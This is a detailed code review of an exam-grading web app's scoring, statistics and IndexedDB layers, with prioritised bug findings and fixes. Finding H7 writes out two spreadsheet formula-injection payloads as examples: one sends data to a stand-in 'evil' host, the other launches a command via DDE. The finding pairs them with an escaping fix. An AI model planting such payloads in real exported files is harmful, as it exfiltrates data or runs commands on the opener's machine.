# Code Review — Scoring / Analysis / Persistence Layer

Date: 2026-09-13 | Branch: main | Mode: read-only
Scope: `src/lib/scoring.js`, `item-analysis.js`, `statistics.js`, `indexed-db-store.js`, `indexed-db-sessions.js`, `indexed-db-results.js`, `local-storage-migration.js`, `session-export-import.js`, `types.js`, `ResultsPage.jsx` (CSV path only).
Out of scope (other owners): OpenCV detection pipeline, React UI. Detection files read only as evidence for data shape.

## Verdict

**NOT production-ready.** Two CRITICAL scoring defects produce wrong grades on ordinary teacher workflows, and one CRITICAL runtime error silently destroys all debug-image persistence. The repo has `checkJs: true, strict: true` in `jsconfig.json` but **no typecheck script and no CI gate** — `npx tsc --noEmit` reports 25 errors in these 8 files, including the ReferenceError below. Running the typechecker that is already configured would have caught 3 of the findings.

---

## Scoring rules AS CURRENTLY IMPLEMENTED (for teacher verification)

Defaults: `src/lib/scoring.js:9-13`.

### Phần I — single choice
- `scorePhanI` (`scoring.js:55-63`). Loop bound = `config.phanI.answers.length` (NOT `questionCount`).
- Award `pointsPerQuestion` (default **0.25**) when `student[i] === key[i]` **and** `student[i]` is truthy.
- Comparison is exact case-sensitive string equality. `'a'` != `'A'`. Blank student answer (`''`/`undefined`) scores 0.

### Phần II — true/false, 4 sub-items per question
- `scorePhanII` (`scoring.js:72-99`). Loop bound = `config.phanII.answers.length`.
- For each question, count sub-items where `student[sub] === key[sub]` over `['a','b','c','d']` (strict boolean compare).
- `partialCredit: true` (default): **score += correctCount × 0.25** → 1 ý = 0.25, 2 ý = 0.50, 3 ý = 0.75, 4 ý = 1.00.
- `partialCredit: false`: 1.00 only if all 4 match, else 0.
- **A blank sub-item is stored as `false`** (`answer-detection.js:107`), so a blank is graded as "student answered Sai".

### Phần III — short numeric answer
- `scorePhanIII` (`scoring.js:107-115`). Loop bound = `config.phanIII.answers.length`.
- Award `pointsPerQuestion` (default **0.5**) on exact string equality, all-or-nothing.
- **Zero normalization.** Student string is built char-by-char from bubbles using `['-',',','0'..'9']` (`bubble-grid-generator.js:252`, `answer-detection.js:141-164`). Teacher key is free text from an unvalidated `<input type="text">` (`ConfigurationPage.jsx:263-272`).

### Totals
- `total = phanI + phanII + phanIII`, rounded to 2 dp (`scoring.js:43`).
- `maxTotal = phanI.questionCount×0.25 + phanII.questionCount×0.25×4 + phanIII.questionCount×0.5` (`scoring.js:34-37`) — uses `questionCount`, while the three scorers use `answers.length`. See C2.
- `percentage = total/maxTotal × 100`, 2 dp.

---

## CRITICAL

### C1 — Phần II partial credit does not match CV1239. Every partially-correct Phần II answer is over-scored.
**File:** `src/lib/scoring.js:88-90` (`score += correctCount * pointsEach`).

Official THPT 2025 scheme (Công văn 1239/BGDĐT-QLCL): **1 ý đúng = 0,10 · 2 ý = 0,25 · 3 ý = 0,50 · 4 ý = 1,00.** The scheme is deliberately non-linear (steep reward for full mastery). The README references CV1239 for the *sheet layout* only (`README.md:147`); the partial-credit table is **not documented anywhere in the repo** — the code's linear rule is an undocumented assumption.

**Failure scenario:** student gets 1 of 4 sub-items right on one Phần II question. Code awards **0.25**; official = **0.10**. Over-credit **+0.15**. Across 4 Phần II questions with 1–2 ý correct each, a candidate gains up to **+0.8 điểm** — enough to change a THPT pass/fail or a university admission cut-off. 2 ý → 0.50 vs 0.25 (+0.25); 3 ý → 0.75 vs 0.50 (+0.25). Only 0 ý and 4 ý are correct today.

**Minimal fix** — replace the partial branch with the official tier table, keeping `pointsPerQuestion` as the per-question maximum:
```js
const PHAN_II_TIERS = [0, 0.1, 0.25, 0.5, 1.0]; // index = số ý đúng
...
if (partialCredit) {
  score += PHAN_II_TIERS[correctCount] * (pointsEach * 4); // pointsEach*4 = max per question
} else if (correctCount === 4) {
  score += pointsEach * 4;
}
```
Do **not** land this without confirming with the user: `pointsPerQuestion` is currently labelled "Phần II (điểm/ý)" in `ConfigurationPage.jsx:182` and is a user-facing configuration decision. See Unresolved Q1.

### C2 — Reducing the question count does not truncate the answer key; students are scored on removed questions and can exceed 100%.
**Files:** `src/components/ConfigurationPage.jsx:46-48` (`updateQuestionCount` mutates only `questionCount`), consumed at `src/lib/scoring.js:57, 74, 109` (loops over `answers.length`) vs `scoring.js:34-37` (`maxTotal` uses `questionCount`).

**Failure scenario:** teacher configures Phần I = 40 câu, fills 40 answers, then realises the paper is 18 câu and changes the count to 18. `config.phanI.answers` still has length 40. `scorePhanI` loops 40 → a student can earn 10.0 điểm while `maxTotal` for Phần I is 4.5. Result: `total > maxTotal`, `percentage = 222%`, and the 22 deleted questions silently contribute grades. The mismatch also desynchronises `item-analysis.js` (loops `questionCount`, so the analysis tab shows 18 questions while the score reflects 40).

**Minimal fix:** bound all three scorers by `questionCount`, which is the single source of truth:
```js
function scorePhanI(studentAnswers, correctAnswers, pointsEach, questionCount) {
  const n = Math.min(questionCount, correctAnswers.length);
  for (let i = 0; i < n; i++) { ... }
}
```
(Same for `scorePhanII` / `scorePhanIII`; pass `config.phanX.questionCount` from `calculateScore`.) Optionally also truncate in `updateQuestionCount` — but the scorer bound is the correctness-critical half.

### C3 — `STORE_NAME` is undefined: all four debug-image functions throw `ReferenceError` at runtime. Debug images are never saved and never retrievable.
**File:** `src/lib/indexed-db-store.js:42, 43, 57, 58, 72, 73, 86, 87`. Confirmed by `npx tsc --noEmit`: `error TS2304: Cannot find name 'STORE_NAME'` ×8. The constant is declared nowhere in `src/` (grep confirms only these 8 uses). The store is literally named `'debugImages'` at line 19.

The failure is **silent** because every call site swallows it: `UploadPage.jsx:99` `saveDebugImage(...).catch(() => {})`, `page.jsx:133` and `page.jsx:146` `clearDebugImages().catch(() => {})`.

**Failure scenario:** teacher processes 300 sheets, expects to open a student's annotated debug image to verify a disputed bubble reading. `getDebugImage` rejects, the image never existed anyway. There is no way to audit a contested grade. `clearDebugImages()` also never clears, so the `debugImages` store (base64 PNGs, MBs per sheet) grows unbounded across sessions and "Xóa kết quả" leaves it intact → eventual `QuotaExceededError` on unrelated writes.

**Minimal fix:** add `const STORE_NAME = 'debugImages';` next to `DB_VERSION` (line 5). Separately, stop swallowing: `.catch((e) => console.error('debug image save failed', e))` at the three call sites.

---

## HIGH

### H1 — Blank Phần II sub-items are graded as "Sai" and earn full credit whenever the key is `false`.
**Files:** `src/lib/answer-detection.js:107` (`{ a:false, b:false, c:false, d:false }` is the *default*, only overwritten when a bubble exceeds threshold, lines 117-119) → compared at `src/lib/scoring.js:83`.

**Failure scenario:** a student leaves Phần II câu 3 entirely blank (ran out of time, or the scan is faint and no bubble clears the fill threshold). The answer key for câu 3 is `{a:false, b:true, c:false, d:false}`. `scorePhanII` sees 3 of 4 sub-items "matching" → awards 0.75 (or 0.50 under the corrected C1 tiers) for a blank question. Statistically, a student who leaves all of Phần II blank scores ~50% of Phần II by construction.

**Minimal fix:** represent "not detected" distinctly (`null`) and skip it:
- `answer-detection.js:107` → `{ a: null, b: null, c: null, d: null }`
- `scoring.js:83` → `if (student[sub] !== null && student[sub] !== undefined && student[sub] === correct[sub])`
- update `types.js:48-53` `TrueFalseAnswer` to `boolean|null`.

This also fixes the identical over-count in `item-analysis.js:57`.

### H2 — Phần III does no numeric normalization; correct answers are marked wrong.
**Files:** `src/lib/scoring.js:110` (`studentAnswers[i] === correctAnswers[i]`), key input `ConfigurationPage.jsx:266-270` (free text, no validation).

Student strings use `,` as the decimal separator (`bubble-grid-generator.js:252`). Teacher types whatever they like.

**Failure scenarios, all producing a wrong 0:**

| Key typed by teacher | Student bubbles | Result |
|---|---|---|
| `1.5` | `1,5` | wrong (dot vs comma) |
| `1,50` | `1,5` | wrong (trailing zero) |
| `0,5` | `,5` | wrong (student omitted leading 0) |
| `1,5 ` (trailing space) | `1,5` | wrong (no trim on key) |
| `01` | `1` | wrong (leading zero) |

Additionally `answer-detection.js:152-159` **collapses skipped character positions**: a student filling position 0 = `1` and position 2 = `5` (leaving position 1 blank) yields `"15"`, not `"1,5"`. `answer.trimEnd()` at line 160 is a no-op since no spaces are ever appended.

**Minimal fix:** normalize both sides in `scorePhanIII` before comparing:
```js
function normalizeNumeric(s) {
  if (typeof s !== 'string') return '';
  const t = s.trim().replace(',', '.');
  const n = Number(t);
  return t === '' || !Number.isFinite(n) ? t.toLowerCase() : String(n);
}
```
then `const a = normalizeNumeric(studentAnswers[i]); if (a !== '' && a === normalizeNumeric(correctAnswers[i]))`. `Number()` collapses `1.50`→`1.5`, `.5`→`0.5`, `01`→`1`, and preserves sign. Apply the same helper at `item-analysis.js:82` so analysis and scoring agree.

### H3 — `openDB()` is called per operation, connections are never closed, and there is no `onblocked` handler → a future schema upgrade deadlocks the app with a promise that never settles.
**File:** `src/lib/indexed-db-store.js:11-31`. Every function in `indexed-db-sessions.js` (lines 8, 19, 30, 41) and `indexed-db-results.js` (lines 8, 19, 31, 43) does `await openDB()` and never calls `db.close()`.

**Failure scenarios:**
1. **Deadlock on DB_VERSION 3.** A second tab is open on the old code holding N un-closed connections. The new tab's `indexedDB.open(name, 3)` fires `blocked`, never `success`, never `error`. `openDB()` neither resolves nor rejects — `page.jsx:38` `await migrateFromLocalStorage()` hangs forever and the app is stuck on the "Đang tải..." spinner with no error. No `onblocked` handler exists (lines 14-30), and no `db.onversionchange` handler exists to let the old tab step aside.
2. **Connection churn.** `saveResults` for 300 students is 1 connection; but `migrateFromLocalStorage` (M1) and `importSession` (M2) open one connection *per result*.

**Minimal fix:** memoize the connection and add the two missing handlers:
```js
let dbPromise = null;
export function openDB() {
  if (dbPromise) return dbPromise;
  dbPromise = new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME, DB_VERSION);
    request.onupgradeneeded = ...;            // unchanged
    request.onblocked = () => reject(new Error('Cơ sở dữ liệu đang bị tab khác khóa'));
    request.onsuccess = () => {
      request.result.onversionchange = () => { request.result.close(); dbPromise = null; };
      resolve(request.result);
    };
    request.onerror = () => { dbPromise = null; reject(request.error); };
  });
  return dbPromise;
}
```

### H4 — Every write transaction can hang forever on abort; no `onabort` handler anywhere.
**Files:** `indexed-db-sessions.js:35, 46`; `indexed-db-results.js:61, 73, 104`; `indexed-db-store.js:45, 75, 89`.

All write paths resolve on `tx.oncomplete` and reject on `tx.onerror`. An IndexedDB transaction that aborts **without** a preceding request error — explicit abort, browser eviction under storage pressure, private-browsing quota shutdown — fires only `onabort`. Neither handler runs → the returned promise never settles.

**Failure scenario:** teacher saves 300 corrected results, browser aborts the transaction under storage pressure. `page.jsx:125` `await saveResults(toSave)` never returns. No error, no spinner on this path, UI shows the corrections as saved. Teacher closes the tab; all 300 corrections are gone.

**Minimal fix:** add `tx.onabort = () => reject(tx.error ?? new DOMException('Transaction aborted', 'AbortError'));` to all 8 write transactions (and to the 5 read transactions for symmetry).

### H5 — Import writes results with a derived ID that collides when `r.id` is missing, silently overwriting students.
**File:** `src/lib/session-export-import.js:55-59` — ``id: `${r.id}_imp_${Date.now()}` ``.

`importSession` performs **no validation on `data.results`** beyond `if (data.results)` (line 53). A `.chambai.json` is arbitrary user-supplied input.

**Failure scenarios:**
1. `data.results` contains entries without `id` (hand-edited file, or an export from a future/older format). All become `"undefined_imp_1757740000000"`. The loop is fast enough that `Date.now()` is identical for all of them → `store.put` **overwrites by keyPath** → 300 students import as 1. Silent data loss with a success path.
2. `data.results` is a string or number → `for...of` throws mid-import, leaving the session row already written at line 51 with a partial or empty result set. No rollback.
3. `data.session` is spread wholesale at line 44 with no shape check. Importing a session whose `config.phanI.answers` is `null` makes `scoring.js:57` throw `TypeError: Cannot read properties of null (reading 'length')` — the results page white-screens with no recovery path.
4. `data.session.name` missing → `"undefined (nhập)"` (line 46), and `exportSession:24` `session.name.replace` then throws on re-export.

**Minimal fix** — validate at the boundary before any write:
```js
if (!Array.isArray(data.results ?? [])) throw new Error('File không hợp lệ: results phải là mảng');
if (typeof data.session?.name !== 'string') throw new Error('File không hợp lệ: thiếu tên phiên');
for (const k of ['phanI','phanII','phanIII']) {
  const s = data.session.config?.[k];
  if (!s || !Array.isArray(s.answers) || !Number.isInteger(s.questionCount)) {
    throw new Error(`File không hợp lệ: cấu hình ${k}`);
  }
}
```
and make result IDs unique by index, not by clock: `` id: `imp_${newSessionId}_${i}` `` using the loop index.

### H6 — `handleResultsUpdate` / `handleResultsClear` rejections are unhandled; the UI reports success while the DB write failed.
**Files:** `src/app/page.jsx:120-133`, called un-awaited from `ResultsPage.jsx:190` (`onResultsUpdate(updated)`).

`handleResultsUpdate` is `async` with a bare `await saveResults(toSave)` and no try/catch. `setResults(updatedResults)` runs **first** (line 121), so React state updates optimistically. If `saveResults` rejects (quota, corrupted store), the rejection surfaces only as an `unhandledrejection` in the console; the grade table shows the corrected scores.

**Failure scenario:** teacher manually corrects 40 disputed sheets, sees each one update in the table, reloads the page next morning → `loadSession` reads from IndexedDB and all 40 corrections are gone.

**Minimal fix:** wrap the write and surface it, reverting optimistic state on failure:
```js
try { await saveResults(toSave); }
catch (err) { console.error(err); setResults(results); alert('Không thể lưu kết quả. Vui lòng thử lại.'); }
```

### H7 — Imported result fields flow unescaped into CSV export → broken rows and formula injection in Excel.
**Files:** `src/components/ResultsPage.jsx:60-65` (raw `.join(',')`, no quoting) fed by `session-export-import.js:55` (unvalidated import).

Detection-produced `studentId` is digits or `'UNKNOWN'` (`answer-detection.js:16-32`) and `examCode` is digits, so a locally-scanned batch is safe today. **An imported `.chambai.json` is not** — `importSession` copies `studentId` / `examCode` verbatim into the result rows that `exportToCSV` serializes.

**Failure scenarios:**
1. `studentId: "A,B"` → the row gains a column; every subsequent column shifts; `Tong diem` lands under `Phan tram`. Silent grade corruption in the file the teacher submits.
2. `studentId: "=HYPERLINK(\"http://evil/\"&A1,\"Click\")"` or `"+cmd|'/c calc'!A1"` → Excel/LibreOffice evaluates it on open (DDE / formula injection), exfiltrating the grade sheet or executing a command.
3. `studentId` containing `\n` → the row splits in two.

Note the BOM at line 67 (`'﻿' + csvContent`) is correct for Excel UTF-8 — keep it. The header row at line 57 is deliberately unaccented ASCII, so diacritics only matter for imported values.

**Minimal fix** — escape every field:
```js
const csvCell = (v) => {
  const s = String(v ?? '');
  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;   // neutralize formula start
  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
};
```
then `[...].map(csvCell).join(',')`.

---

## MEDIUM

### M1 — Migration is not atomic and not idempotent under concurrency; a mid-way failure duplicates every student on the next boot.
**File:** `src/lib/local-storage-migration.js:45-56`.

Order is: write session (45) → write results one at a time (49-51) → delete localStorage keys (54-55) → set `chambai_migrated` (56).

**Failure scenarios:**
1. **Partial migration → duplicates.** `saveResult` rejects on result 150 of 300 (quota). The `await` throws out of the function; lines 54-56 never run. `chambai_migrated` is unset and `studentResults` is still in localStorage, so the next boot re-runs the whole thing with a **new** `sessionId` (line 33, `Date.now()`), producing a second session with the same students. The first session's 150 orphaned results remain permanently.
2. **Corrupt JSON → app never loads sessions.** `JSON.parse` at lines 34 and 48 is unguarded. If `localStorage.testConfig` is truncated, migration throws on *every* boot; `page.jsx:40-42` catches and logs, so `setSessions(allSessions)` at line 40 never runs — the session list is permanently empty even though sessions exist in IndexedDB. The user's only recourse is clearing site data (destroying everything).
3. **Two tabs.** Both read `chambai_migrated === null` before either writes it → two migrated sessions.

**Minimal fix:** set the flag *before* destructive work, guard the parses, and batch the writes into one transaction:
```js
let config, results = [];
try { config = configStr ? JSON.parse(configStr) : DEFAULT_CONFIG; results = resultsStr ? JSON.parse(resultsStr) : []; }
catch { localStorage.setItem('chambai_migrated', '1'); return null; }   // unparseable: don't loop forever
if (!Array.isArray(results)) results = [];
await saveSession(session);
if (results.length) await saveResults(results.map((r) => ({ ...r, sessionId })));
localStorage.setItem('chambai_migrated', '1');
localStorage.removeItem('testConfig');
localStorage.removeItem('studentResults');
```
`saveResults` already exists (`indexed-db-results.js:66`) and is a single transaction — use it instead of the N-await loop.

### M2 — Sequential per-result transactions in migration and import (N+1 on IndexedDB).
**Files:** `local-storage-migration.js:49-51`, `session-export-import.js:54-60`.

Each iteration is `await saveResult(r)` → `await openDB()` + a fresh `readwrite` transaction. Importing a 500-student session is 500 connections and 500 transactions serialized on the main thread; the tab visibly freezes and, worse, **each transaction commits independently** — a failure at #300 leaves 299 committed with no rollback (compounds H5/M1).

**Minimal fix:** use the existing batch `saveResults(array)` in both places.

### M3 — `handleResultsUpdate` only `put`s; deleted results are never removed from IndexedDB and reappear on reload.
**File:** `src/app/page.jsx:120-126`.

`saveResults(toSave)` writes the current array but never deletes rows absent from it. Any removal of a student from the results array leaves the row in the `results` store keyed to the same `sessionId`; `loadSession` (`page.jsx:53`) reads via `getSessionResults(sessionId)` and the removed student is back.

**Minimal fix:** a single `replaceSessionResults(sessionId, results)` helper that clears via the `sessionId` index cursor and puts in **one** transaction. (Calling `deleteSessionResults` then `saveResults` is not atomic — a failure between them loses everything.)

### M4 — Answer keys that were never set are reported as 0% correct rather than "no key".
**Files:** `src/lib/item-analysis.js:16, 24` and `:75, 82`.

If the teacher left câu 7 of Phần I blank in the config, `correct` is `undefined`. Every student's non-empty answer fails `ans === correct`, so `correctPct = 0` and `difficulty = 'Khó'`. The analysis tab shows a red "very hard" question that is actually an unconfigured key. Phần II already guards this (`item-analysis.js:48`, `if (!correct) continue;`); Phần I and III do not.

**Minimal fix:** add `if (!correct) continue;` at `item-analysis.js:17` and `:76`, matching existing Phần II behaviour.

### M5 — CSV export silently exports only the filtered subset.
**File:** `src/components/ResultsPage.jsx:56` (guard uses `results`) vs `:60` (rows come from `sortedResults`, filtered by `filterText` at `:34-37`).

**Failure scenario:** teacher types `12A` into the search box to spot-check one class, forgets to clear it, clicks "Xuất CSV". The button is enabled (guard passes on the unfiltered `results.length`) and the downloaded file contains only that class — or, if the filter matches nothing, **just the header row**. The teacher submits an empty grade sheet.

**Minimal fix:** guard on the exported set and mark the filename:
```js
if (sortedResults.length === 0) { alert('Không có kết quả nào khớp bộ lọc.'); return; }
const suffix = filterText ? `_loc_${filterText.replace(/[^\w]/g, '')}` : '';
```

### M6 — `URL.revokeObjectURL` is called synchronously after `.click()` on a detached anchor.
**Files:** `session-export-import.js:22-26`, `ResultsPage.jsx:68-72`.

The anchor is never appended to the document. In Chrome this happens to work; in Firefox a detached anchor's programmatic `click()` is unreliable, and revoking the object URL in the same tick can cancel an in-flight download. Symptom is an intermittent failed or zero-byte file with no error.

**Minimal fix:** `document.body.appendChild(link); link.click(); link.remove(); setTimeout(() => URL.revokeObjectURL(url), 0);`

### M7 — Item analysis percentages are rounded independently and need not sum to 100.
**File:** `src/lib/item-analysis.js:33, 38, 39` (and `85, 90, 91`).

`total = 3`, `correctCount = 1`, `blankCount = 1` → `33 + 33 + 33 = 99%`. `total = 6`, correct 1, blank 1 → `17 + 67 + 17 = 101%`. A teacher reading the analysis table sees percentages that do not add up and loses trust in the tool.

**Minimal fix:** compute two and derive the third: `wrongPct = 100 - correctPct - blankPct`.

### M8 — Phần II item analysis denominator excludes blank students, inflating `correctPct` relative to Phần I/III.
**File:** `src/lib/item-analysis.js:53-59` — `if (!ans) continue;` skips the student entirely, so `totalSubs` shrinks. Phần I and III instead divide by `total` (all results, lines 33, 85). Two sections of the same table use different denominators. `blankPct` is also hardcoded to `0` and `commonWrong` to `'-'` (line 68), so Phần II rows carry no blank/distractor signal at all. Compounded by H1, where blanks are indistinguishable from `false`.

**Minimal fix:** after H1 lands (`null` for undetected), count `null` sub-items into a `blankSubs` counter and divide by `total * 4` for consistency with the other sections.

---

## LOW

### L1 — `checkJs`/`strict` is configured but never enforced; 25 type errors in these 8 files.
`jsconfig.json:3-4` sets `checkJs: true, strict: true`. `package.json:5-9` has `dev`, `build`, `start`, `lint` — **no `typecheck`**. `npx eslint .` passes with 4 `no-img-element` warnings and 0 errors (the flat Next config does not enable `no-undef` for modules), so **nothing in the toolchain catches C3**.

Verified output of `npx tsc --noEmit --checkJs --strict` over the scoped files: 8× `TS2304 Cannot find name 'STORE_NAME'` (C3); 2× `TS7053` on `TrueFalseAnswer` string indexing (`scoring.js:83`); 9× `TS2339 Property 'phanI'/'phanII'/'phanIII' does not exist on type 'object'` (`item-analysis.js` — the `@param {object} config` JSDoc at line 6 is untyped; it should be `{import('./types.js').TestConfig}`); 2× `TS2339` in `session-export-import.js:18, 24`; 2× on `event.target` in `indexed-db-results.js:97`.

**Minimal fix:** add `"typecheck": "tsc --noEmit --ignoreDeprecations 6.0"` to `package.json` scripts and fix the 25 errors. The `TS7053` at `scoring.js:83` is fixed by typing the loop: `const subs = /** @type {const} */ (['a','b','c','d']);`.

### L2 — `statistics.js` counts unscored results as 0, dragging the class mean down.
`src/lib/statistics.js:9, 14` — `r.score?.total ?? 0`. Today every result is scored in `ResultsPage.jsx:20` before reaching `calculateClassStatistics`, so this is latent; it becomes a live bug the moment a caller passes raw results. Prefer `results.filter(r => r.score).map(r => r.score.total)`.

### L3 — `min`/`max` are not rounded while `mean`/`median` are.
`src/lib/statistics.js:32-35`. Cosmetic today — 0.25/0.5 accumulations are binary-exact (verified: 18×0.25 === 4.5 exactly). It becomes visible the moment the C1 tier value `0.1` is introduced (7×0.1 = 0.7000000000000001). Round `min`/`max` the same way, and round the per-section `phanI`/`phanII`/`phanIII` returns at `scoring.js:39-41`, which are currently unrounded and flow straight into the CSV (`ResultsPage.jsx:62`).

### L4 — No discrimination index exists, despite being expected of item analysis.
`src/lib/item-analysis.js` computes only `correctPct` and a 3-band `getDifficulty` threshold (80/50, lines 101-105). There is no point-biserial or upper/lower-27%-group discrimination index. Flagging because the review brief expected one; this is a **missing feature, not a defect** — confirm before adding (Unresolved Q3).

### L5 — Duplicated mean/median logic.
`src/components/score-distribution-chart.jsx:32-37` reimplements the exact median/mean from `statistics.js:15-19` instead of consuming `calculateClassStatistics`. Two copies will diverge. (Chart file is outside the assigned scope — cross-reference only.)

---

## Statistics verified CORRECT (no action)

Checked and found sound, so future reviewers do not re-litigate:
- `statistics.js:10` — `.map().sort()` sorts the mapped copy; `results` is **not** mutated.
- `statistics.js:17-19` — median handles even length (`(n/2-1 + n/2)/2`) and odd length correctly.
- `statistics.js:12` — empty input returns `null` before any division; no `NaN` mean.
- `statistics.js:23-28` — distribution bins are consistently half-open `[lo, hi)` with a closed top bucket; exactly `20` lands in `'20-40'`, `100` lands in `'80-100'`. No double-count, no gap.
- `scoring.js:45` — `maxTotal > 0` guard prevents divide-by-zero when all question counts are 0.
- `indexed-db-results.js:66-75` — `saveResults` puts all records inside one transaction with no intervening `await`, so the transaction does not auto-close. **No await-inside-transaction bug exists anywhere in these files** — all IDB request chains are synchronous within their Promise executor. This was specifically checked per the brief.

---

## Highest-value test targets (project currently has zero tests)

Pure, dependency-free, directly grade-affecting — test these first:
1. `scoring.js` `calculateScore` — C1 tier table, C2 count/answers mismatch, H1 blank sub-items, H2 numeric normalization. Highest value by a wide margin.
2. `statistics.js` `calculateClassStatistics` — empty, single, even/odd length, bin boundaries at exactly 20/40/60/80/100.
3. `item-analysis.js` `analyzeItems` — M4 missing key, M7 percentage sum, M8 denominator.
4. `session-export-import.js` — export→import round-trip identity, plus malformed-input rejection (H5 cases 1-4).

---

## Recommended actions (in order)

1. **C1** — confirm the CV1239 tier table with the user, then fix `scoring.js:88-90`. Re-grade stored sessions.
2. **C2** — bound all three scorers by `questionCount`.
3. **C3** — declare `STORE_NAME`; stop swallowing errors at the 3 call sites.
4. **H1, H2** — blank-vs-false representation and numeric normalization.
5. **L1** — add the `typecheck` script and wire it into the pre-commit / CI path before anything else lands.
6. **H3, H4** — connection reuse, `onblocked`, `onversionchange`, `onabort`.
7. **H5, H7** — validate imported JSON at the boundary; escape CSV cells.
8. **H6, M1, M2, M3** — error surfacing, atomic migration, batch writes.
9. Medium/Low as capacity allows.

---

## Unresolved questions

1. **C1 is a user decision, not just a bug.** The config UI labels Phần II as "điểm/ý" (points per sub-item, `ConfigurationPage.jsx:182`), which only makes sense under the linear rule. The official CV1239 tiers are per-question and non-linear. Does the user want (a) strict CV1239 tiers with the per-question max configurable, (b) linear as an explicitly-chosen house rule, or (c) both, selectable? Do not change the scoring model without this answer.
2. Are there saved sessions in the wild scored under the linear Phần II rule? Fixing C1 changes historical grades on reload — is a re-grade notice needed, or should stored `score` objects be treated as immutable snapshots?
3. Is a discrimination index (L4) actually wanted, or is the 3-band difficulty rating the intended scope?
4. What is the expected `.chambai.json` trust model — teacher-to-teacher sharing (H7 formula injection matters) or strictly self-backup (lower priority)?
5. Phần III: is `PHAN_III_CHARS_PER_QUESTION = 5` (`answer-detection.js:129`) guaranteed to match the printed sheet for every subject, and should a skipped middle position be flagged as an error rather than silently collapsed (H2)?
